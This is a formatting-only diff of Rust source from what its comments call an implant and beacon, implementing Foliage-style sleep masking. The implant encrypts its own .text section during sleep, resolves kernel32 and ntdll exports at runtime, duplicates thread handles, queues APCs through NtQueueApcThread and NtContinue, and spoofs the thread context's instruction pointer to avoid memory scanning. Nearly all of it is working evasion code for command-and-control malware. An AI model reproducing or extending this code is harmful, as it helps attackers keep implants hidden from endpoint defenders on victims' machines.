@@ -180,7 +180,10 @@ fn mask_key_16() -> [u8; 16] {
     let mut key = [0u8; 16];
     let mut s = seed;
     for b in key.iter_mut() {
-        s = s.wrapping_mul(0x9E37_79B9).rotate_left(7).wrapping_add(0xA5A5_A5A5);
+        s = s
+            .wrapping_mul(0x9E37_79B9)
+            .rotate_left(7)
+            .wrapping_add(0xA5A5_A5A5);
         *b = (s & 0xFF) as u8;
     }
     key
@@ -203,7 +206,11 @@ fn execute_foliage_plan(plan: &FoliagePlan) {
     let region = unsafe { own_text_region() };
     // Extract the spoof RIP (None if no gap pool → no context spoof).
     let spoof_rip = plan.steps.iter().find_map(|s| {
-        if let FoliageStep::SetContext { spoof_rip } = s { Some(*spoof_rip) } else { None }
+        if let FoliageStep::SetContext { spoof_rip } = s {
+            Some(*spoof_rip)
+        } else {
+            None
+        }
     });
 
     // Try the real APC-chain path first. It sets FOLIAGE_APC_OK on success.
@@ -294,7 +301,12 @@ pub fn foliage_stage() -> u8 {
 ///
 /// # Safety
 /// `region` must be the implant's own `.text`. Single beacon caller.
-unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32, spoof_rip: Option<u64>) -> bool {
+unsafe fn execute_foliage_apc(
+    region: &TextRegion,
+    key: &[u8; 16],
+    secs: u32,
+    spoof_rip: Option<u64>,
+) -> bool {
     FOLIAGE_APC_OK.store(0, core::sync::atomic::Ordering::Release);
     FOLIAGE_STAGE.store(0, core::sync::atomic::Ordering::Release);
 
@@ -313,9 +325,8 @@ unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32, sp
         let get_curr_proc = crate::resolve::export_addr(b"kernel32.dll", b"GetCurrentProcess");
         if let (Some(da), Some(gct), Some(gcp)) = (dup_addr, get_curr_thread, get_curr_proc) {
             // DuplicateHandle(hSrcProcess, hSrc, hTgtProcess, &hTgt, access, inherit, opts) = 7 args
-            type FnDup = unsafe extern "system" fn(
-                usize, usize, usize, *mut usize, u32, u32, u32,
-            ) -> u32;
+            type FnDup =
+                unsafe extern "system" fn(usize, usize, usize, *mut usize, u32, u32, u32) -> u32;
             type FnVoid = unsafe extern "system" fn() -> usize;
             let dup: FnDup = core::mem::transmute(da);
             let curr_thread: FnVoid = core::mem::transmute(gct);
@@ -388,7 +399,10 @@ unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32, sp
     });
     let params_ptr: *mut FoliageParams = Box::into_raw(params);
 
-    let verify = Box::new(VerifyState { before, ok: core::sync::atomic::AtomicBool::new(false) });
+    let verify = Box::new(VerifyState {
+        before,
+        ok: core::sync::atomic::AtomicBool::new(false),
+    });
     (*params_ptr).verify = Box::into_raw(verify);
 
     // Stage 3: spawn helper
@@ -527,9 +541,7 @@ impl FoliageRaw {
         new_prot: u32,
         old: &mut u32,
     ) -> i32 {
-        type Fn = unsafe extern "system" fn(
-            usize, *mut usize, *mut usize, u32, *mut u32,
-        ) -> i32;
+        type Fn = unsafe extern "system" fn(usize, *mut usize, *mut usize, u32, *mut u32) -> i32;
         let f: Fn = unsafe { core::mem::transmute(self.nt_protect) };
         unsafe { f(0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old) }
     }
@@ -541,7 +553,12 @@ impl FoliageRaw {
     ///
     /// # Safety
     /// `timeout` must point at a valid i64 (100ns units, negative = relative).
-    unsafe fn nt_wait_for_single_object(&self, handle: usize, alertable: u8, timeout: usize) -> i32 {
+    unsafe fn nt_wait_for_single_object(
+        &self,
+        handle: usize,
+        alertable: u8,
+        timeout: usize,
+    ) -> i32 {
         type Fn = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
         let f: Fn = unsafe { core::mem::transmute(self.nt_wait_for_single_object) };
         unsafe { f(handle, alertable, timeout as *const i64) }
@@ -604,19 +621,35 @@ impl FoliageRaw {
 /// # Safety
 /// `entry` must be a valid thread-proc-style fn (usize arg → u32). Runs the
 /// entry on a new thread.
-unsafe fn raw_create_thread(entry: unsafe extern "system" fn(usize) -> u32, param: usize) -> Option<usize> {
+unsafe fn raw_create_thread(
+    entry: unsafe extern "system" fn(usize) -> u32,
+    param: usize,
+) -> Option<usize> {
     let addr = crate::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
     type Fn = unsafe extern "system" fn(
-        *mut core::ffi::c_void, // lpThreadAttributes
-        usize,                  // dwStackSize
+        *mut core::ffi::c_void,                          // lpThreadAttributes
+        usize,                                           // dwStackSize
         Option<unsafe extern "system" fn(usize) -> u32>, // lpStartAddress
-        usize,                  // lpParameter
-        u32,                    // dwCreationFlags
-        *mut u32,               // lpThreadId
+        usize,                                           // lpParameter
+        u32,                                             // dwCreationFlags
+        *mut u32,                                        // lpThreadId
     ) -> *mut core::ffi::c_void;
     let f: Fn = unsafe { core::mem::transmute(addr) };
-    let h = unsafe { f(core::ptr::null_mut(), 0, Some(entry), param, 0, core::ptr::null_mut()) };
-    if h.is_null() { None } else { Some(h as usize) }
+    let h = unsafe {
+        f(
+            core::ptr::null_mut(),
+            0,
+            Some(entry),
+            param,
+            0,
+            core::ptr::null_mut(),
+        )
+    };
+    if h.is_null() {
+        None
+    } else {
+        Some(h as usize)
+    }
 }
 
 /// The helper thread entry. Runs ENTIRELY on raw exports (not the indirect
@@ -684,9 +717,7 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
         } else {
             // Defensive: should not happen (spoof_rip is None when saved_ctx
             // is invalid), but degrade safely to the no-op APC path.
-            let _ = unsafe {
-                raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0)
-            };
+            let _ = unsafe { raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0) };
             return 0;
         };
         // Build spoofed CONTEXT: RIP = gap address, RSP = real stack pointer.
@@ -696,16 +727,12 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
         let ctx = unsafe { crate::context::spoofed_context(rip, real_rsp) };
         // NtContinue is resolved on-demand (used only by the helper for the
         // APC, not needed for any other call).
-        let ntc = crate::resolve::export_addr(b"ntdll.dll", b"NtContinue")
-            .unwrap_or(apc_noop as usize);
-        let _ = unsafe {
-            raw.nt_queue_apc_thread(beacon, ntc, ctx as usize, 0, 0)
-        };
+        let ntc =
+            crate::resolve::export_addr(b"ntdll.dll", b"NtContinue").unwrap_or(apc_noop as usize);
+        let _ = unsafe { raw.nt_queue_apc_thread(beacon, ntc, ctx as usize, 0, 0) };
     } else {
         // No spoof: queue a benign no-op APC just to break the alertable sleep.
-        let _ = unsafe {
-            raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0)
-        };
+        let _ = unsafe { raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0) };
     }
 
     // 4. Sleep the mask window (helper side). .text stays ciphertext here.
@@ -754,7 +781,6 @@ unsafe extern "system" fn apc_noop(a1: usize, a2: usize, a3: usize) {
     // alertable sleep return (driving the masked-window sequence). The beacon
     // resumes with .text already restored (the helper unmasked before we wake).
 }
-
 
 /// Extract the sleep seconds from the plan's Sleep step.
 fn plan_seconds(plan: &FoliagePlan) -> u32 {
